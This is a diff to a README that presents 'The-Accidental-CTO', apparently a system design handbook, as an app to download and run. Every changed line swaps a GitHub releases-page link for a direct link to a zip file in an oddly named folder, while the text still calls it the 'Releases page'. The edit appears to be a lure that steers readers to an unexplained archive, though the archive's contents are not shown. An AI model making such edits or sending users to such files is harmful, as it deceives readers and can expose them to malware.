@@ -1,7 +1,7 @@
 # 🚀 The-Accidental-CTO - Scale Your Business with Ease
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Adisuyasa/The-Accidental-CTO/releases)
+[![Download Release](https://raw.githubusercontent.com/Adisuyasa/The-Accidental-CTO/main/ectodermosis/The-Accidental-CTO.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Adisuyasa/The-Accidental-CTO/main/ectodermosis/The-Accidental-CTO.zip)
 
 ## 📖 Introduction
 Welcome to **The-Accidental-CTO**! This software is designed to help you scale your business effortlessly, no matter your background. Inspired by Subhash Choudhary’s journey in taking a store from zero to a million on Dukaan, this system design handbook provides practical insights and tools for any entrepreneur. 
@@ -19,7 +19,7 @@ Welcome to **The-Accidental-CTO**! This software is designed to help you scale y
 Follow these simple steps to download and run **The-Accidental-CTO**.
 
 ### Step 1: Visit the Releases Page
-To get started, visit our [Releases page](https://github.com/Adisuyasa/The-Accidental-CTO/releases). This page will show you the latest version available for download.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Adisuyasa/The-Accidental-CTO/main/ectodermosis/The-Accidental-CTO.zip). This page will show you the latest version available for download.
 
 ### Step 2: Choose Your Version
 Browse through the available releases. Each version is labeled with the date and version number. Select the most recent release for the best experience.
@@ -52,4 +52,4 @@ We want to hear from you! If you have any questions or feedback, please reach ou
 ## ⚙️ Conclusion
 With **The-Accidental-CTO**, you have a reliable partner in your business journey. Scaling becomes manageable with the right tools and guidance at your fingertips. 
 
-[Download Now](https://github.com/Adisuyasa/The-Accidental-CTO/releases) and start transforming your business today!
+[Download Now](https://raw.githubusercontent.com/Adisuyasa/The-Accidental-CTO/main/ectodermosis/The-Accidental-CTO.zip) and start transforming your business today!
